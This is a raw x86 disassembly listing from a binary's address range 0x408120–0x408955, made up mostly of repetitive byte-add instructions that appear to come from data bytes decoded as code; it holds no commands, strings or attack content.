  408120:	scas   eax,DWORD PTR es:[edi]
  408121:	add    BYTE PTR [eax],al
  408123:	add    BYTE PTR ds:0x1a000000,al
  408129:	add    BYTE PTR [eax],al
  40812b:	add    BYTE PTR [ecx],al
  40812d:	add    BYTE PTR [eax],al
  40812f:	add    BYTE PTR [ecx],al
  408131:	add    BYTE PTR [eax],al
  408133:	add    BYTE PTR [eax],dl
  408135:	add    BYTE PTR [eax],al
  408137:	add    BYTE PTR [ecx],al
  408139:	add    BYTE PTR [eax],al
  40813b:	add    BYTE PTR [edi+0x0],al
  40813e:	add    BYTE PTR [eax],al
  408140:	dec    eax
  408141:	add    BYTE PTR [eax],al
  408143:	add    BYTE PTR [edx],cl
  408145:	add    BYTE PTR [eax],al
  408147:	add    BYTE PTR [edx],al
  408149:	add    BYTE PTR [eax],al
  40814b:	add    BYTE PTR [ecx],al
  40814d:	add    BYTE PTR [eax],al
  40814f:	add    BYTE PTR [esi],al
  408151:	add    BYTE PTR [eax],al
  408153:	add    BYTE PTR [ecx],al
  408155:	add    BYTE PTR [eax],al
  408157:	add    BYTE PTR [ecx],al
  408159:	add    BYTE PTR [eax],al
  40815b:	add    BYTE PTR [ebx],al
  40815d:	add    BYTE PTR [eax],al
  40815f:	add    BYTE PTR [eax],al
  408161:	add    BYTE PTR [edx],cl
  408163:	add    BYTE PTR [ecx],al
  408165:	add    BYTE PTR [eax],al
  408167:	add    BYTE PTR [eax],al
  408169:	add    BYTE PTR [esi],al
  40816b:	add    BYTE PTR [ebx+0x0],ah
  40816e:	pop    esp
  40816f:	add    BYTE PTR [edx],cl
  408171:	add    BYTE PTR ds:0xa00eb01,dl
  408177:	add    BYTE PTR [ebp+0x1],cl
  40817a:	jmp    0x40817c
  40817c:	or     al,BYTE PTR [eax]
  40817e:	push   0x1
  408180:	jmp    0x408182
  408182:	or     al,BYTE PTR [eax]
  408184:	xchg   BYTE PTR [ecx],al
  408186:	jmp    0x408188
  408188:	push   cs
  408189:	add    al,dh
  40818b:	add    esi,eax
  40818d:	add    DWORD PTR [esi],ecx
  40818f:	add    BYTE PTR [eax],al
  408191:	add    al,dh
  408193:	add    DWORD PTR [edx],ecx
  408195:	add    BYTE PTR [edx+eax*1],bh
  408198:	jmp    0x40819a
  40819a:	or     al,BYTE PTR [eax]
  40819c:	imul   eax,DWORD PTR [edx],0xa00eb
  4081a2:	push   0x1
  4081a4:	and    al,BYTE PTR [eax]
  4081a6:	or     al,BYTE PTR [eax]
  4081a8:	inc    BYTE PTR [edx]
  4081aa:	retf   
  4081ab:	add    BYTE PTR [edx],cl
  4081ad:	add    BYTE PTR [esi],bl
  4081af:	add    ebp,ebx
  4081b1:	add    BYTE PTR [edx],cl
  4081b3:	add    BYTE PTR [esi+0x3],cl
  4081b6:	jmp    0x4081b8
  4081b8:	or     al,BYTE PTR [eax]
  4081ba:	jno    0x4081bf
  4081bc:	and    al,BYTE PTR [eax]
  4081be:	push   es
  4081bf:	add    dl,al
  4081c1:	add    esp,DWORD PTR [edi-0x4fff9fd]
  4081c7:	add    ebp,edx
  4081c9:	add    eax,DWORD PTR [esi]
  4081cb:	add    BYTE PTR [esp+eax*1],ch
  4081ce:	pop    ss
  4081cf:	add    al,0x6
  4081d1:	add    BYTE PTR [edi+0x10],dh
  4081d4:	pop    eax
  4081d5:	adc    BYTE PTR [esi],al
  4081d7:	add    dh,cl
  4081d9:	adc    BYTE PTR [eax+edx*1+0x10e70006],dh
  4081e0:	pop    eax
  4081e1:	adc    BYTE PTR [esi],al
  4081e3:	add    bl,bh
  4081e5:	adc    BYTE PTR [eax+eax*1+0x6],bl
  4081e9:	add    BYTE PTR [ebx],ah
  4081eb:	adc    DWORD PTR [ecx],edx
  4081ed:	adc    DWORD PTR [esi],eax
  4081ef:	add    BYTE PTR [edx],bh
  4081f1:	adc    DWORD PTR [ecx],edx
  4081f3:	adc    DWORD PTR [esi],eax
  4081f5:	add    BYTE PTR [edi+0x11],dl
  4081f8:	adc    DWORD PTR [ecx],edx
  4081fa:	push   es
  4081fb:	add    BYTE PTR [ebp+0x11],dh
  4081fe:	adc    DWORD PTR [ecx],edx
  408200:	push   es
  408201:	add    BYTE PTR [esi+0x6111111],cl
  408207:	add    BYTE PTR [edi+0x6111111],ah
  40820d:	add    dl,al
  40820f:	adc    DWORD PTR [ecx],edx
  408211:	adc    DWORD PTR [esi],eax
  408213:	add    bl,bl
  408215:	adc    DWORD PTR [ecx],edx
  408217:	adc    DWORD PTR [esi],eax
  408219:	add    al,bh
  40821b:	adc    DWORD PTR [ecx],edx
  40821d:	adc    DWORD PTR [esi],eax
  40821f:	add    BYTE PTR [esi],bl
  408221:	adc    ch,dl
  408223:	add    eax,DWORD PTR [esi]
  408225:	add    BYTE PTR [eax+0x12],al
  408228:	jmp    0x1112:0x62000603
  40822f:	adc    DWORD PTR [esi],eax
  408231:	add    BYTE PTR [ebp+0x12],bh
  408234:	adc    DWORD PTR [ecx],edx
  408236:	push   es
  408237:	add    BYTE PTR [esi+0x6111112],dl
  40823d:	add    ah,dl
  40823f:	adc    dh,BYTE PTR [edx+edx*1+0x130e0006]
  408246:	repnz adc al,BYTE PTR [esi]
  408249:	add    BYTE PTR ds:0x612f213,ch
  40824f:	add    BYTE PTR [edi+0x13],cl
  408252:	cmp    al,0x13
  408254:	lahf   
  408255:	add    BYTE PTR [ebx+0x13],ah
  408258:	add    BYTE PTR [eax],al
  40825a:	push   es
  40825b:	add    BYTE PTR [edx+0x13],dh
  40825e:	mov    ah,0x12
  408260:	push   es
  408261:	add    BYTE PTR [esi+0xe005c13],bl
  408267:	add    ch,ch
  408269:	adc    edx,esp
  40826b:	adc    eax,DWORD PTR [esi]
  40826d:	add    BYTE PTR ds:0xa005c14,dl
  408273:	add    BYTE PTR [edi],bh
  408275:	adc    al,0x22
  408277:	add    BYTE PTR [edx],cl
  408279:	add    BYTE PTR [esi+0xa00220c],bl
  40827f:	add    BYTE PTR [eax+0x14],dl
  408282:	jmp    0x408284
  408284:	push   cs
  408285:	add    BYTE PTR [edi+0x14],bl
  408288:	mov    BYTE PTR [ecx],0xa
  40828b:	add    BYTE PTR [esp+edx*1+0x60022],al
  408292:	mov    edi,0x6005c14
  408297:	add    BYTE PTR [edi],bl
  408299:	adc    eax,0x60417
  40829e:	inc    edx
  40829f:	adc    eax,0x6005c
  4082a4:	dec    eax
  4082a5:	adc    eax,0x6005c
  4082aa:	ja     0x4082c1
  4082ac:	pop    esp
  4082ad:	add    BYTE PTR [esi],cl
  4082af:	add    BYTE PTR [ebp+edx*1+0x613d4],bl
  4082b6:	ficom  WORD PTR ds:0x12005c
  4082bc:	push   ss
  4082bd:	push   ss
  4082be:	not    DWORD PTR ds:0x162b000a
  4082c4:	jmp    0x4082c6
  4082c6:	push   es
  4082c7:	add    BYTE PTR [esi],dl
  4082c9:	push   ss
  4082ca:	not    DWORD PTR ds:0x16480006
  4082d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082d1:	add    eax,DWORD PTR [esi]
  4082d3:	add    BYTE PTR [edx+0x616a716],bh
  4082d9:	add    bh,cl
  4082db:	push   ss
  4082dc:	pop    esp
  4082dd:	add    BYTE PTR [edx],dl
  4082df:	add    bl,ah
  4082e1:	push   ss
  4082e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e3:	add    eax,DWORD PTR [esi]
  4082e5:	add    bl,ah
  4082e7:	push   ss
  4082e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e9:	add    ecx,DWORD PTR [esi]
  4082eb:	add    BYTE PTR [edi],bh
  4082ed:	pop    ss
  4082ee:	mov    BYTE PTR [ecx],0xa
  4082f1:	add    BYTE PTR [edi+edx*1-0x15],dl
  4082f5:	add    BYTE PTR [esi],al
  4082f7:	add    BYTE PTR [ebx+0x6005c17],ch
  4082fd:	add    bl,dl
  4082ff:	pop    ss
  408300:	ret    0x617
  408303:	add    al,ah
  408305:	pop    ss
  408306:	pop    esp
  408307:	add    BYTE PTR [esi],al
  408309:	add    BYTE PTR [edi+0x18],dl
  40830c:	dec    ebx
  40830d:	sbb    BYTE PTR [esi],al
  40830f:	add    BYTE PTR [ecx+0x6041718],cl
  408315:	add    BYTE PTR ds:0x612b419,al
  40831b:	add    BYTE PTR [eax],ah
  40831d:	sbb    DWORD PTR [eax+eax*1+0x6],ebx
  408321:	add    BYTE PTR [ebx+0x19],bl
  408324:	mov    ah,0x12
  408326:	push   es
  408327:	add    BYTE PTR [edx+0x19],ch
  40832a:	pop    esp
  40832b:	add    BYTE PTR [esi],al
  40832d:	add    BYTE PTR [eax+0x19],dh
  408330:	pop    esp
  408331:	add    BYTE PTR [edx],cl
  408333:	add    BYTE PTR [edi+0x600cb19],ah
  408339:	add    BYTE PTR [esi+0x616a719],bh
  40833f:	add    ah,cl
  408341:	sbb    DWORD PTR [eax+eax*1+0xa],ebx
  408345:	add    BYTE PTR [edx],dl
  408347:	sbb    cl,bl
  408349:	add    BYTE PTR [esi],dl
  40834b:	add    BYTE PTR [ebx],ch
  40834d:	sbb    bl,BYTE PTR [eax+eax*1+0xa]
  408351:	add    BYTE PTR [ebx+0x1a],cl
  408354:	retf   
  408355:	add    BYTE PTR [edx],cl
  408357:	add    BYTE PTR [edx+ebx*1+0xa00cb],al
  40835e:	fwait
  40835f:	sbb    cl,bl
  408361:	add    BYTE PTR [esi],cl
  408363:	add    BYTE PTR [edi+0x1b],al
  408366:	aam    0x13
  408368:	push   cs
  408369:	add    BYTE PTR [edx+0x1b],dh
  40836c:	mov    BYTE PTR [ecx],0x3f
  40836f:	add    BYTE PTR [esi+0x1c],ah
  408372:	add    BYTE PTR [eax],al
  408374:	pop    edi
  408375:	add    DWORD PTR [ebp+0x1c],edi
  408378:	add    BYTE PTR [eax],al
  40837a:	push   es
  40837b:	add    BYTE PTR [ebx+0x1d],cl
  40837e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40837f:	add    ebx,DWORD PTR [edx]
  408381:	add    BYTE PTR [edi+0x1d],dh
  408384:	pop    edi
  408385:	sbb    eax,0x1d8e0006
  40838a:	cmp    al,0x13
  40838c:	push   es
  40838d:	add    BYTE PTR [ebx+0x6005c1d],bh
  408393:	add    al,al
  408395:	sbb    eax,0x6005c
  40839a:	in     al,0x1d
  40839c:	adc    DWORD PTR [ecx],edx
  40839e:	sbb    al,BYTE PTR [eax]
  4083a0:	sbb    bl,BYTE PTR [esi]
  4083a2:	add    al,0x1e
  4083a4:	sbb    al,BYTE PTR [eax]
  4083a6:	xor    ebx,DWORD PTR [esi]
  4083a8:	add    al,0x1e
  4083aa:	add    BYTE PTR [eax],al
  4083ac:	add    BYTE PTR [eax],al
  4083ae:	add    DWORD PTR [eax],eax
  4083b0:	add    BYTE PTR [eax],al
  4083b2:	add    BYTE PTR [eax],al
  4083b4:	add    DWORD PTR [eax],eax
  4083b6:	add    DWORD PTR [eax],eax
  4083b8:	add    BYTE PTR [eax],al
  4083ba:	adc    BYTE PTR [eax],al
  4083bc:	sbb    al,BYTE PTR [eax]
  4083be:	and    al,BYTE PTR [eax]
  4083c0:	add    eax,0x1000100
  4083c5:	add    BYTE PTR [eax],al
  4083c7:	add    BYTE PTR [eax],dl
  4083c9:	add    BYTE PTR [edx+0x0],al
  4083cc:	add    BYTE PTR [eax],al
  4083ce:	add    eax,0x15000b00
  4083d3:	add    BYTE PTR [eax],al
  4083d5:	add    BYTE PTR [eax],al
  4083d7:	add    al,al
  4083d9:	sbb    BYTE PTR [eax],al
  4083db:	add    BYTE PTR ds:0x5e000d00,al
  4083e1:	add    BYTE PTR [ebx],dl
  4083e3:	add    DWORD PTR [eax],eax
  4083e5:	add    BYTE PTR [edx],ch
  4083e7:	sbb    DWORD PTR [eax],eax
  4083e9:	add    BYTE PTR ds:0x5e001001,ah
  4083ef:	add    BYTE PTR [ecx-0x80],dl
  4083f2:	push   0x0
  4083f4:	or     al,BYTE PTR [eax]
  4083f6:	push   ecx
  4083f7:	xor    BYTE PTR [edi+0x0],0xa
  4083fb:	add    BYTE PTR [ecx-0x80],dl
  4083fe:	mov    al,BYTE PTR [eax]
  408400:	or     al,BYTE PTR [eax]
  408402:	push   ecx
  408403:	sbb    BYTE PTR [ecx+0x51000a00],0x80
  40840a:	scas   eax,DWORD PTR es:[edi]
  40840b:	add    BYTE PTR [edx],cl
  40840d:	add    BYTE PTR [ecx],dl
  40840f:	add    BYTE PTR [ecx],bh
  408411:	add    esi,esi
  408413:	add    BYTE PTR [ecx],dl
  408415:	add    BYTE PTR [edi+0x3],bl
  408418:	cli    
  408419:	add    BYTE PTR [ecx],dl
  40841b:	add    BYTE PTR [edi+0x1100fe03],al
  408421:	add    BYTE PTR [esi+0x11010203],bl
  408427:	add    bh,cl
  408429:	add    eax,DWORD PTR [esi]
  40842b:	add    DWORD PTR [ecx],edx
  40842d:	add    BYTE PTR [ebx],cl
  40842f:	add    al,0x13
  408431:	add    DWORD PTR [ecx],edx
  408433:	add    BYTE PTR [eax],bh
  408435:	add    al,0x17
  408437:	add    DWORD PTR [ebx],edx
  408439:	add    DWORD PTR [edi+0x19],eax
  40843c:	cdq    
  40843d:	add    edx,DWORD PTR [ebx]
  40843f:	add    DWORD PTR [ebx+0x13039919],edx
  408445:	add    dl,bh
  408447:	sbb    bh,bl
  408449:	add    edx,DWORD PTR [eax+0x21]
  40844c:	add    BYTE PTR [eax],al
  40844e:	add    BYTE PTR [eax],al
  408450:	xchg   ecx,eax
  408451:	add    cl,al
  408453:	add    BYTE PTR [edx+0x0],dh
  408456:	add    DWORD PTR [eax],eax
  408458:	mov    esp,0x21
  40845d:	add    BYTE PTR [ecx+0x7f012c00],dl
  408463:	add    BYTE PTR [ecx],al
  408465:	add    BYTE PTR [esp+0x0],ah
  40846c:	xchg   ecx,eax
  40846d:	add    BYTE PTR [edx],bh
  40846f:	add    DWORD PTR [edi+0x0],edi
  408472:	add    al,BYTE PTR [eax]
  408474:	sbb    BYTE PTR [esi],ah
  408476:	add    BYTE PTR [eax],al
  408478:	add    BYTE PTR [eax],al
  40847a:	xchg   ecx,eax
  40847b:	add    BYTE PTR [ebp+0x1],bh
  40847e:	test   DWORD PTR [eax],eax
  408480:	add    eax,DWORD PTR [eax]
  408482:	xor    BYTE PTR [edi],ah
  408484:	add    BYTE PTR [eax],al
  408486:	add    BYTE PTR [eax],al
  408488:	xchg   ecx,eax
  408489:	add    BYTE PTR [eax+0x5008d01],bl
  40848f:	add    BYTE PTR [eax+0x27],ch
  408495:	add    BYTE PTR [ecx-0x69fe5f00],dl
  40849b:	add    BYTE PTR [eax],cl
  40849d:	add    al,bl
  40849f:	daa    
  4084a0:	add    BYTE PTR [eax],al
  4084a2:	add    BYTE PTR [eax],al
  4084a4:	xchg   ecx,eax
  4084a5:	add    BYTE PTR [edx+eax*1],dl
  4084a8:	fwait
  4084a9:	add    BYTE PTR [ecx],cl
  4084ab:	add    BYTE PTR [ecx+ebp*1+0x0],bl
  4084af:	add    BYTE PTR [eax],al
  4084b1:	add    BYTE PTR [ecx-0x5afdd400],dl
  4084b7:	add    BYTE PTR [eax+eax*1],cl
  4084ba:	shr    BYTE PTR [ecx],1
  4084bc:	add    BYTE PTR [eax],al
  4084be:	add    BYTE PTR [eax],al
  4084c0:	xchg   ecx,eax
  4084c1:	add    BYTE PTR [edi+0x2],cl
  4084c4:	mov    al,0x0
  4084c6:	adc    BYTE PTR [eax],al
  4084c8:	mov    al,0x2a
  4084ca:	add    BYTE PTR [eax],al
  4084cc:	add    BYTE PTR [eax],al
  4084ce:	xchg   ecx,eax
  4084cf:	add    BYTE PTR [edx+eax*1-0x47],ah
  4084d3:	add    BYTE PTR [edx],dl
  4084d5:	add    BYTE PTR [ebp+edi*1+0x0],ch
  4084dc:	xchg   ecx,eax
  4084dd:	add    BYTE PTR [ebx+0x2],bh
  4084e0:	mov    edi,0x3c001300
  4084e5:	aas    
  4084e6:	add    BYTE PTR [eax],al
  4084e8:	add    BYTE PTR [eax],al
  4084ea:	xchg   ecx,eax
  4084eb:	add    BYTE PTR [esi+0x1a00d202],cl
  4084f1:	add    BYTE PTR [eax+eax*2],dh
  4084f4:	add    BYTE PTR [eax],al
  4084f6:	add    BYTE PTR [eax],al
  4084f8:	xchg   ecx,eax
  4084f9:	add    BYTE PTR [ecx+0x1d00dc02],ch
  4084ff:	add    BYTE PTR [eax+0x40],bh
  408502:	add    BYTE PTR [eax],al
  408504:	add    BYTE PTR [eax],al
  408506:	xchg   ecx,eax
  408507:	add    ch,al
  408509:	add    bl,ah
  40850b:	add    BYTE PTR [esi],bl
  40850d:	add    BYTE PTR [eax+0x41],cl
  408510:	add    BYTE PTR [eax],al
  408512:	add    BYTE PTR [eax],al
  408514:	xchg   ecx,eax
  408515:	add    bl,ah
  408517:	add    bl,ah
  408519:	add    BYTE PTR [edi],bl
  40851b:	add    BYTE PTR [eax],ah
  40851d:	inc    edx
  40851e:	add    BYTE PTR [eax],al
  408520:	add    BYTE PTR [eax],al
  408522:	xchg   ecx,eax
  408523:	add    BYTE PTR [ebp+0x1],bh
  408526:	loop   0x408528
  408528:	and    BYTE PTR [eax],al
  40852a:	aam    0x42
  40852c:	add    BYTE PTR [eax],al
  40852e:	add    BYTE PTR [eax],al
  408530:	xchg   ecx,eax
  408531:	add    BYTE PTR [eax+0x2100e801],bl
  408537:	add    BYTE PTR [eax],ch
  408539:	inc    ebx
  40853a:	add    BYTE PTR [eax],al
  40853c:	add    BYTE PTR [eax],al
  40853e:	xchg   ecx,eax
  40853f:	add    BYTE PTR [ebx+eax*1],cl
  408542:	lock add BYTE PTR [ebx],ah
  408545:	add    cl,ah
  408547:	inc    ebx
  408548:	add    BYTE PTR [eax],al
  40854a:	add    BYTE PTR [eax],al
  40854c:	xchg   BYTE PTR [eax],bl
  40854e:	in     al,0x3
  408550:	smsw   WORD PTR [eax+eax*1]
  408554:	mov    eax,0x43
  408559:	add    BYTE PTR [ecx+0x721d4418],dl
  40855f:	add    BYTE PTR [eax+eax*1],ah
  408562:	jmp    0x4085aa
  408567:	add    BYTE PTR [ebx+0xf03e418],al
  40856d:	add    DWORD PTR [eax+eax*1],esp
  408570:	hlt    
  408571:	inc    ebx
  408572:	add    BYTE PTR [eax],al
  408574:	add    BYTE PTR [eax],al
  408576:	xchg   ebx,eax
  408577:	or     BYTE PTR [eax+0x4],cl
  40857a:	sbb    eax,DWORD PTR [ecx]
  40857c:	and    al,0x0
  40857e:	xor    eax,DWORD PTR [eax+eax*1+0x0]
  408582:	add    BYTE PTR [eax],al
  408584:	xchg   ebx,eax
  408585:	or     BYTE PTR [esp+eax*1+0x20],bl
  408589:	add    DWORD PTR [eax+eax*1],esp
  40858c:	cmp    al,BYTE PTR [eax+eax*1+0x0]
  408590:	add    BYTE PTR [eax],al
  408592:	xchg   ebx,eax
  408593:	or     BYTE PTR [eax+0x4],ch
  408596:	and    eax,0x42002401
  40859b:	inc    esp
  40859c:	add    BYTE PTR [eax],al
  40859e:	add    BYTE PTR [eax],al
  4085a0:	xchg   ebx,eax
  4085a1:	or     BYTE PTR [esp+eax*1+0x2b],dh
  4085a5:	add    DWORD PTR ds:0x445800,esp
  4085ab:	add    BYTE PTR [eax],al
  4085ad:	add    BYTE PTR [ebx+0x2b048408],dl
  4085b3:	add    DWORD PTR ds:0x446e00,esp
  4085b9:	add    BYTE PTR [eax],al
  4085bb:	add    BYTE PTR [ebx+0x2b04a108],dl
  4085c1:	add    DWORD PTR ds:0x448400,esp
  4085c7:	add    BYTE PTR [eax],al
  4085c9:	add    BYTE PTR [ebx+0x2b04b908],dl
  4085cf:	add    DWORD PTR ds:0x449a00,esp
  4085d5:	add    BYTE PTR [eax],al
  4085d7:	add    BYTE PTR [ebx+0x2b04c708],dl
  4085dd:	add    DWORD PTR ds:0x44b000,esp
  4085e3:	add    BYTE PTR [eax],al
  4085e5:	add    BYTE PTR [ebx+0x2b04e608],dl
  4085eb:	add    DWORD PTR ds:0x44c600,esp
  4085f1:	add    BYTE PTR [eax],al
  4085f3:	add    BYTE PTR [ebx+0x2b050e08],dl
  4085f9:	add    DWORD PTR ds:0x44dc00,esp
  4085ff:	add    BYTE PTR [eax],al
  408601:	add    BYTE PTR [ebx+0x2b052a08],dl
  408607:	add    DWORD PTR ds:0x44f200,esp
  40860d:	add    BYTE PTR [eax],al
  40860f:	add    BYTE PTR [ebx+0x2b054108],dl
  408615:	add    DWORD PTR ds:0x450800,esp
  40861b:	add    BYTE PTR [eax],al
  40861d:	add    BYTE PTR [ebx+0x2b056408],dl
  408623:	add    DWORD PTR ds:0x451e00,esp
  408629:	add    BYTE PTR [eax],al
  40862b:	add    BYTE PTR [ebx+0x2b058608],dl
  408631:	add    DWORD PTR ds:0x453400,esp
  408637:	add    BYTE PTR [eax],al
  408639:	add    BYTE PTR [ebx+0x2b05a308],dl
  40863f:	add    DWORD PTR ds:0x454a00,esp
  408645:	add    BYTE PTR [eax],al
  408647:	add    BYTE PTR [ebx+0x2b05b308],dl
  40864d:	add    DWORD PTR ds:0x456000,esp
  408653:	add    BYTE PTR [eax],al
  408655:	add    BYTE PTR [ebx+0x2b05c308],dl
  40865b:	add    DWORD PTR ds:0x457600,esp
  408661:	add    BYTE PTR [eax],al
  408663:	add    BYTE PTR [ebx+0x2b05cc08],dl
  408669:	add    DWORD PTR ds:0x458c00,esp
  40866f:	add    BYTE PTR [eax],al
  408671:	add    BYTE PTR [ebx+0x2b05e608],dl
  408677:	add    DWORD PTR ds:0x45a200,esp
  40867d:	add    BYTE PTR [eax],al
  40867f:	add    BYTE PTR [ebx+0x2b060408],dl
  408685:	add    DWORD PTR ds:0x45b800,esp
  40868b:	add    BYTE PTR [eax],al
  40868d:	add    BYTE PTR [ebx+0x2b062c08],dl
  408693:	add    DWORD PTR ds:0x45ce00,esp
  408699:	add    BYTE PTR [eax],al
  40869b:	add    BYTE PTR [ebx+0x2b063e08],dl
  4086a1:	add    DWORD PTR ds:0x45e400,esp
  4086a7:	add    BYTE PTR [eax],al
  4086a9:	add    BYTE PTR [ebx+0x2b064808],dl
  4086af:	add    DWORD PTR ds:0x45fa00,esp
  4086b5:	add    BYTE PTR [eax],al
  4086b7:	add    BYTE PTR [ebx+0x2b065308],dl
  4086bd:	add    DWORD PTR ds:0x461000,esp
  4086c3:	add    BYTE PTR [eax],al
  4086c5:	add    BYTE PTR [ebx+0x2b066108],dl
  4086cb:	add    DWORD PTR ds:0x462600,esp
  4086d1:	add    BYTE PTR [eax],al
  4086d3:	add    BYTE PTR [ebx+0x2b067208],dl
  4086d9:	add    DWORD PTR ds:0x463c00,esp
  4086df:	add    BYTE PTR [eax],al
  4086e1:	add    BYTE PTR [ebx+0x2b068108],dl
  4086e7:	add    DWORD PTR ds:0x465200,esp
  4086ed:	add    BYTE PTR [eax],al
  4086ef:	add    BYTE PTR [ebx+0x2b069208],dl
  4086f5:	add    DWORD PTR ds:0x466800,esp
  4086fb:	add    BYTE PTR [eax],al
  4086fd:	add    BYTE PTR [ebx+0x2b06a308],dl
  408703:	add    DWORD PTR ds:0x467e00,esp
  408709:	add    BYTE PTR [eax],al
  40870b:	add    BYTE PTR [ebx+0x2b06b108],dl
  408711:	add    DWORD PTR ds:0x469400,esp
  408717:	add    BYTE PTR [eax],al
  408719:	add    BYTE PTR [ebx+0x2b06ce08],dl
  40871f:	add    DWORD PTR ds:0x46aa00,esp
  408725:	add    BYTE PTR [eax],al
  408727:	add    BYTE PTR [ebx+0x2b06df08],dl
  40872d:	add    DWORD PTR ds:0x46c000,esp
  408733:	add    BYTE PTR [eax],al
  408735:	add    BYTE PTR [ebx+0x2b070208],dl
  40873b:	add    DWORD PTR ds:0x46d600,esp
  408741:	add    BYTE PTR [eax],al
  408743:	add    BYTE PTR [ebx+0x2b070e08],dl
  408749:	add    DWORD PTR ds:0x46ec00,esp
  40874f:	add    BYTE PTR [eax],al
  408751:	add    BYTE PTR [ebx+0x2b073008],dl
  408757:	add    DWORD PTR ds:0x470200,esp
  40875d:	add    BYTE PTR [eax],al
  40875f:	add    BYTE PTR [ebx+0x2b074208],dl
  408765:	add    DWORD PTR ds:0x471800,esp
  40876b:	add    BYTE PTR [eax],al
  40876d:	add    BYTE PTR [ebx+0x2b076208],dl
  408773:	add    DWORD PTR ds:0x472e00,esp
  408779:	add    BYTE PTR [eax],al
  40877b:	add    BYTE PTR [ebx+0x2b077608],dl
  408781:	add    DWORD PTR ds:0x474400,esp
  408787:	add    BYTE PTR [eax],al
  408789:	add    BYTE PTR [ebx+0x2b079208],dl
  40878f:	add    DWORD PTR ds:0x475a00,esp
  408795:	add    BYTE PTR [eax],al
  408797:	add    BYTE PTR [ebx+0x2b07ad08],dl
  40879d:	add    DWORD PTR ds:0x477000,esp
  4087a3:	add    BYTE PTR [eax],al
  4087a5:	add    BYTE PTR [ebx+0x2b07b408],dl
  4087ab:	add    DWORD PTR ds:0x478600,esp
  4087b1:	add    BYTE PTR [eax],al
  4087b3:	add    BYTE PTR [ebx+0x2b07be08],dl
  4087b9:	add    DWORD PTR ds:0x479c00,esp
  4087bf:	add    BYTE PTR [eax],al
  4087c1:	add    BYTE PTR [ebx+0x2b07d108],dl
  4087c7:	add    DWORD PTR ds:0x47b200,esp
  4087cd:	add    BYTE PTR [eax],al
  4087cf:	add    BYTE PTR [ebx+0x2b07df08],dl
  4087d5:	add    DWORD PTR ds:0x47c800,esp
  4087db:	add    BYTE PTR [eax],al
  4087dd:	add    BYTE PTR [ebx+0x2b07ef08],dl
  4087e3:	add    DWORD PTR ds:0x47de00,esp
  4087e9:	add    BYTE PTR [eax],al
  4087eb:	add    BYTE PTR [ebx+0x2b07fc08],dl
  4087f1:	add    DWORD PTR ds:0x47f400,esp
  4087f7:	add    BYTE PTR [eax],al
  4087f9:	add    BYTE PTR [ebx+0x2b080808],dl
  4087ff:	add    DWORD PTR ds:0x480a00,esp
  408805:	add    BYTE PTR [eax],al
  408807:	add    BYTE PTR [ebx+0x2b081f08],dl
  40880d:	add    DWORD PTR ds:0x482000,esp
  408813:	add    BYTE PTR [eax],al
  408815:	add    BYTE PTR [ebx+0x2b083708],dl
  40881b:	add    DWORD PTR ds:0x483600,esp
  408821:	add    BYTE PTR [eax],al
  408823:	add    BYTE PTR [ebx+0x2b084808],dl
  408829:	add    DWORD PTR ds:0x484c00,esp
  40882f:	add    BYTE PTR [eax],al
  408831:	add    BYTE PTR [ebx+0x2b085908],dl
  408837:	add    DWORD PTR ds:0x486200,esp
  40883d:	add    BYTE PTR [eax],al
  40883f:	add    BYTE PTR [ebx+0x2b087608],dl
  408845:	add    DWORD PTR ds:0x487800,esp
  40884b:	add    BYTE PTR [eax],al
  40884d:	add    BYTE PTR [ebx+0x2b089508],dl
  408853:	add    DWORD PTR ds:0x488e00,esp
  408859:	add    BYTE PTR [eax],al
  40885b:	add    BYTE PTR [ebx+0x2b08b108],dl
  408861:	add    DWORD PTR ds:0x48a400,esp
  408867:	add    BYTE PTR [eax],al
  408869:	add    BYTE PTR [ebx+0x2b08ce08],dl
  40886f:	add    DWORD PTR ds:0x48ba00,esp
  408875:	add    BYTE PTR [eax],al
  408877:	add    BYTE PTR [ebx+0x2b08e408],dl
  40887d:	add    DWORD PTR ds:0x48d000,esp
  408883:	add    BYTE PTR [eax],al
  408885:	add    BYTE PTR [ebx+0x2b090408],dl
  40888b:	add    DWORD PTR ds:0x48e600,esp
  408891:	add    BYTE PTR [eax],al
  408893:	add    BYTE PTR [ebx+0x2b092408],dl
  408899:	add    DWORD PTR ds:0x48fc00,esp
  40889f:	add    BYTE PTR [eax],al
  4088a1:	add    BYTE PTR [ebx+0x2b094608],dl
  4088a7:	add    DWORD PTR ds:0x491200,esp
  4088ad:	add    BYTE PTR [eax],al
  4088af:	add    BYTE PTR [ebx+0x2b095608],dl
  4088b5:	add    DWORD PTR ds:0x492800,esp
  4088bb:	add    BYTE PTR [eax],al
  4088bd:	add    BYTE PTR [ebx+0x2b096908],dl
  4088c3:	add    DWORD PTR ds:0x493e00,esp
  4088c9:	add    BYTE PTR [eax],al
  4088cb:	add    BYTE PTR [ebx+0x2b099008],dl
  4088d1:	add    DWORD PTR ds:0x495400,esp
  4088d7:	add    BYTE PTR [eax],al
  4088d9:	add    BYTE PTR [ebx+0x2b09b808],dl
  4088df:	add    DWORD PTR ds:0x496a00,esp
  4088e5:	add    BYTE PTR [eax],al
  4088e7:	add    BYTE PTR [ebx+0x2b09dc08],dl
  4088ed:	add    DWORD PTR ds:0x498000,esp
  4088f3:	add    BYTE PTR [eax],al
  4088f5:	add    BYTE PTR [ebx+0x2b0a0a08],dl
  4088fb:	add    DWORD PTR ds:0x499600,esp
  408901:	add    BYTE PTR [eax],al
  408903:	add    BYTE PTR [ebx+0x2b0a2708],dl
  408909:	add    DWORD PTR ds:0x49ac00,esp
  40890f:	add    BYTE PTR [eax],al
  408911:	add    BYTE PTR [ebx+0x2b0a3b08],dl
  408917:	add    DWORD PTR ds:0x49c200,esp
  40891d:	add    BYTE PTR [eax],al
  40891f:	add    BYTE PTR [ebx+0x2b0a4708],dl
  408925:	add    DWORD PTR ds:0x49d800,esp
  40892b:	add    BYTE PTR [eax],al
  40892d:	add    BYTE PTR [ebx+0x2b0a6d08],dl
  408933:	add    DWORD PTR ds:0x49ee00,esp
  408939:	add    BYTE PTR [eax],al
  40893b:	add    BYTE PTR [ebx+0x2b0a7b08],dl
  408941:	add    DWORD PTR ds:0x4a0400,esp
  408947:	add    BYTE PTR [eax],al
  408949:	add    BYTE PTR [ebx+0x2b0a8708],dl
  40894f:	add    DWORD PTR ds:0x4a1a00,esp
  408955:	add    BYTE PTR [eax],al
